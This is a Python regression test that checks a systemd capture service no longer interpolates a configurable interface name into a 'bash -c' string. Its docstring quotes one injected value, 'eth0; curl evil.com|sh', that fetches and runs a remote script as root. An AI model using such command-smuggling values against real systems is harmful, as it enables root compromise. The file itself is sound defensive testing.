#!/usr/bin/env python3
"""
#320: regression guard for the CAPTURE_IFACE shell-interpolation fix.

The OLD `configs/systemd/zeek-host-capture.service` ExecStart line was
`/bin/bash -c 'set -o pipefail; tcpdump -i ${CAPTURE_IFACE} ... | docker run
...'` — systemd substitutes `${CAPTURE_IFACE}` (an operator-configurable
value from the untracked /etc/default/zeek-host-capture) directly into the
STRING passed to `bash -c`, so a value like "eth0; curl evil.com|sh" would
execute as root on the next restart (security-auditor review). Fixed by
moving the tcpdump|docker pipeline into scripts/setup/host_capture.sh and
passing CAPTURE_IFACE as a systemd Exec argv element instead — per
systemd.service(5), a `${VAR}` reference in an Exec*= line is substituted
as a single, unsplit argument regardless of its contents, so it can never
be re-parsed as shell syntax once there's no `bash -c '...'` layer left to
re-interpret it.

Nothing else in this suite would catch a regression back to the vulnerable
shape — test_zeek_image_pin.py only checks the pinned image tag/digest, not
the invocation shape. Static text/regex assertions against the real files,
same convention as this directory's other Zeek-capture-path checks (see
test_capture_loss_monitoring.py, test_zeek_image_pin.py) — no live
systemd/Docker needed.

Run:  python tests/pipeline/test_zeek_capture_iface_hardening.py  (or: pytest tests/pipeline)
"""

import re
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SERVICE_UNIT = (ROOT / "configs" / "systemd" / "zeek-host-capture.service").read_text(encoding="utf-8")
HOST_CAPTURE_SH = (ROOT / "scripts" / "setup" / "host_capture.sh").read_text(encoding="utf-8")


def _exec_start_line(text: str) -> str:
    for line in text.splitlines():
        if line.startswith("ExecStart="):
            return line
    raise AssertionError("no ExecStart= line found")


class CaptureIfaceIsNeverShellInterpolatedTests(unittest.TestCase):
    def test_execstart_does_not_wrap_capture_iface_in_a_bash_dash_c_string(self):
        # The exact vulnerable shape: ${CAPTURE_IFACE} appearing inside a
        # 'bash -c ...' single-argument string, where bash itself would
        # re-parse the substituted value as shell syntax. A future edit
        # that reintroduces this (e.g. "for convenience") must fail here.
        exec_start = _exec_start_line(SERVICE_UNIT)
        if "bash -c" in exec_start:
            self.assertNotIn(
                "${CAPTURE_IFACE}", exec_start,
                "ExecStart= interpolates ${CAPTURE_IFACE} into a 'bash -c' "
                "string again — this is the exact #320 shell-injection shape "
                "(a hostile /etc/default/zeek-host-capture value could "
                "execute as root on restart). Pass it as a script argument "
                "instead, the way host_capture.sh's own header comment "
                "explains.")

    def test_execstart_invokes_host_capture_script_with_capture_iface_as_its_own_argument(self):
        # Confirms the REPLACEMENT shape is actually in place, not just that
        # the old one is gone — a regression to some THIRD, equally-broken
        # form (e.g. re-inlining the pipeline some other way) would pass the
        # test above but should still fail this one.
        exec_start = _exec_start_line(SERVICE_UNIT)
        self.assertRegex(
            exec_start,
            r"ExecStart=/bin/bash\s+\S*host_capture\.sh\s+\"\$\{CAPTURE_IFACE\}\"\s*$",
            "ExecStart= no longer matches the expected "
            "'/bin/bash .../host_capture.sh \"${CAPTURE_IFACE}\"' shape")

    def test_host_capture_script_always_quotes_the_interface_argument(self):
        # host_capture.sh binds argv[1] to IFACE once, then must reference
        # it ONLY as the quoted "$IFACE" everywhere else — an unquoted
        # $IFACE would be subject to bash's own word-splitting/globbing,
        # reopening a (narrower, but real) version of the same class of bug
        # this fix exists to close. shellcheck (SC2086) would also catch an
        # unquoted expansion like this in CI, but this test pins the
        # specific property directly rather than relying only on an
        # external linter's default rule set.
        unquoted = re.findall(r"(?<!\")\$IFACE(?!\")", HOST_CAPTURE_SH)
        self.assertEqual(
            [], unquoted,
            "host_capture.sh references $IFACE without quotes somewhere — "
            "every use must be \"$IFACE\"")
        self.assertIn('"$IFACE"', HOST_CAPTURE_SH,
                       "host_capture.sh should reference the interface as "
                       "the quoted \"$IFACE\" at least once (the tcpdump -i "
                       "invocation)")


if __name__ == "__main__":
    unittest.main(verbosity=2)
